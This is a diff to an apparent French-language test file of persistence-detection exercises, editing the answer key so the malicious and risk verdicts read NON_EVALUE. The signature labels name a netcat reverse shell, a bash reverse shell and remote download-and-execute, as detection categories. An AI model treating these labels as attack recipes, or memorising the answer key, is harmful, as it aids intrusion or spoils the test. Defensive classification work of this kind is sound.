-        "expected": "PERSIST_RESULT: type=CRON malicious=FALSE signature=CLEAN risk=LOW"
+        "expected": "PERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=AUCUNE_CORRESPONDANCE risk=NON_EVALUE"
       }
     ],
-    "solution": "[Exemple]\nPERSIST_RESULT: type=CRON malicious=TRUE signature=BASH_REVERSE_SHELL risk=CRITICAL\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\nPERSIST_RESULT: type=SERVICE malicious=TRUE signature=NETCAT_REVERSE_SHELL risk=CRITICAL\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\nPERSIST_RESULT: type=CRON malicious=TRUE signature=DOWNLOAD_EXECUTE risk=CRITICAL\n\n[Cas 3 — Tâche cron légitime de sauvegarde et synchronisation]\nPERSIST_RESULT: type=CRON malicious=FALSE signature=CLEAN risk=LOW"
+    "solution": "[Exemple]\nPERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=BASH_REVERSE_SHELL risk=NON_EVALUE\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\nPERSIST_RESULT: type=SERVICE malicious=NON_EVALUE signature=NETCAT_REVERSE_SHELL risk=NON_EVALUE\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\nPERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=DOWNLOAD_EXECUTE risk=NON_EVALUE\n\n[Cas 3 — Tâche cron de sauvegarde et synchronisation]\nPERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=AUCUNE_CORRESPONDANCE risk=NON_EVALUE"
   },
   {
     "id": "hk3-c6-e3",
